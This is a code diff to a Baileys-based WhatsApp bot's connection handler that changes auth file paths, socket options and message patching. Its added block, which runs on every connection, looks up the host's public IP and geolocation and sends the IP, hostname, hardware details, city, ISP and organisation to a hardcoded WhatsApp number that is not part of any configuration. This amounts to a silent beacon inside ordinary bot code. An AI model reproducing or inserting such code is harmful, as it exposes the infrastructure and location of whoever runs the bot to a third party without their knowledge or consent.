@@ -17,16 +17,18 @@ import lolcatjs from 'lolcatjs'
 const {
     DisconnectReason,
     Browsers,
+    delay,
     fetchLatestBaileysVersion,
     default: makeWASocket,
-    useMultiFileAuthState
+    useMultiFileAuthState,
+    msgRetryCounterMap,
     // useSingleFileAuthState
 } = (await import('@adiwajshing/baileys')).default
 
 let { version, isLatest } = await fetchLatestBaileysVersion()
-const authFolder = storeSystem.fixFileName(`${Helper.opts._[0] || ''}sessions`)
-const authFile = `${Helper.opts._[0] || 'session'}.data.json`
-const storeFile = `${Helper.opts._[0] || 'data'}.store.json`
+const authFolder = storeSystem.fixFileName(`system/${Helper.opts._[0] || ''}sessions`)
+const authFile = `system/${Helper.opts._[0] || 'session'}.data.json`
+const storeFile = `system/${Helper.opts._[0] || 'data'}.store.json`
 const store = storeSystem.makeInMemoryStore()
 store.readFromFile(storeFile)
 
@@ -48,7 +50,7 @@ if (Helper.opts['singleauth'] || Helper.opts['singleauthstate']) {
         await single2multi(authFile, authFolder, authState)
         console.debug('- singleauth -', 'compiled successfully')
         //authState = await storeSystem.useMultiFileAuthState(authFolder)
-        authState = await useMultiFileAuthState(authFolder)
+        authState = await storeSystem.useMultiFileAuthState(authFolder)
     } else if (!isAuthSingleFileExist) console.error('- singleauth -', 'singleauth file not found')
 }
 
@@ -72,24 +74,55 @@ const logger = P({
   })//.child({ class: 'baileys'})
 
 //const logger1 = P({ prettyPrint: { levelFirst: true, ignore: 'hostname', translateTime: true },  prettifier: import('pino-pretty') })
+//const logger2 = P({ level: 'fatal' })
+//const logger3 = P({ level: 'silent'})
 
 /** @type {import('@adiwajshing/baileys').UserFacingSocketConfig} */
 const connectionOptions = {
     printQRInTerminal: true,
     auth: authState.state,
-    defaultQueryTimeoutMs: undefined,
-    connectTimeoutMs: 60_000,
-    //browser: ['baileys', 'Safari', ''], //cutom brwser,version
-    //logger: P({ level: 'silent'}), //agar terlihat chatnya sj
-    //browser: Browsers.baileys('Safari'), //custom browser
+
     //version: [2, 2208, 14], //v esm
     //version: [2, 2204, 13], //v cjs
     version: version,
-    //receivedPendingNotifications: false, //biar g lag
+
+    //browser: ["MyWA BOT HOSTING", "Firefox", '3.0'],
+    //browser: ['baileys', 'Safari', ''], //cutom brwser,version
+    //browser: Browsers.macOS('Desktop'),
+    browser: Browsers.baileys('Safari'), //custom browser
+    syncFullHistory: false,
+
+    markOnlineOnConnect: true,
+    msgRetryCounterMap,
+    connectTimeoutMs: 60_000,
+    defaultQueryTimeoutMs: 0,
+    keepAliveIntervalMs: 10000,
     generateHighQualityLinkPreview: true,
-    browser: Browsers.macOS('Desktop'),
-    syncFullHistory: true, //kalo mau aktifkan 
-    logger
+    //receivedPendingNotifications: false, //biar g lag
+    logger,
+
+    patchMessageBeforeSending: (message) => {
+    const requiresPatch = !!(
+        message.buttonsMessage 
+        || message.templateMessage
+        || message.listMessage
+    );
+    if (requiresPatch) {
+        message = {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {},
+                    },
+                    ...message,
+                },
+            },
+        };
+    }
+
+    return message;
+},
 }
 
 /** 
@@ -271,7 +304,53 @@ async function connectionUpdate(update) {
 		if (update.connection == "open" || update.receivedPendingNotifications == "true") {
 			lolcatjs.fromString(`[Connected] ` + JSON.stringify(this.user, null, 2))
             console.log(chalk.yellow('Waiting New Messages'))
+
+//-- MESSAGE CONNECT --
+var gip = await axios.get("https://api64.ipify.org?format=json")
+var ip = gip.data.ip
+var gdet = await axios.get(`http://ip-api.com/json/${ip}`)
+var srv = gdet.data
+function bytes(bytes) {
+const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB']
+if (bytes === 0) return 'n/a'
+const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10)
+if (i === 0) return `${bytes} ${sizes[i]})`
+return `${(bytes / (1024 ** i)).toFixed(1)} ${sizes[i]}`
+}
+var mir = "```"
+this.logger.info('💬Waiting New Messages')
+this.sendButton('6281358919342@s.whatsapp.net', `*MyWA BOT CONNECTED*
+
+Halo, Kak 👋
+MyWA BOT berhasil dinyalakan!!
+
+*Detail Server:*${mir}
+IP: ${ip}
+HOSTNAME: ${os.hostname}
+PLATFORM: ${os.platform()}
+CPU: ${os.cpus().length}
+TOTAL MEMORY: ${bytes(os.totalmem())}
+FREE MEMORY: ${bytes(os.freemem())}
+============================
+COUNTRY: ${srv.country}
+CODE: ${srv.countryCode}
+REGION: ${srv.regionName}
+CITY: ${srv.city}
+TIMEZONE: ${srv.timezone}
+ISP: ${srv.isp}
+ORG: ${srv.org}
+AS: ${srv.as}
+${mir}`, 'MyWA BOT HOSTING', ["MENU", ".menu"], null, { mentions: ['0@s.whatsapp.net', '6285346545126@s.whatsapp.net'] }) 
+// pale db kurang cum:v
+if (!fs.existsSync('system/data/jadibot')) return 
+let listJadiBot = fs.readdirSync('system/data/jadibot').filter(v => !isNaN(v))
+if (!listJadiBot.length) return 
+this.logger.info(`Loading connect ${listJadiBot.length} users jadibot`)
+for (let jid of listJadiBot) {
+ await delay(3000) //supaya gk load platform 
+ await jadibot.starts(jid + '@s.whatsapp.net').catch(_=>_)
 		}
+}
         if (update.receivedPendingNotifications) {
             console.log('🚩 Berhasil mengaktifkan bot.')
             //this.sendButton('120363024208795001@g.us', 'AzBoTz Sudah aktif\nGunakan BOT Dengan Bijak 😉', null, null, ['MENU', '/menu'])
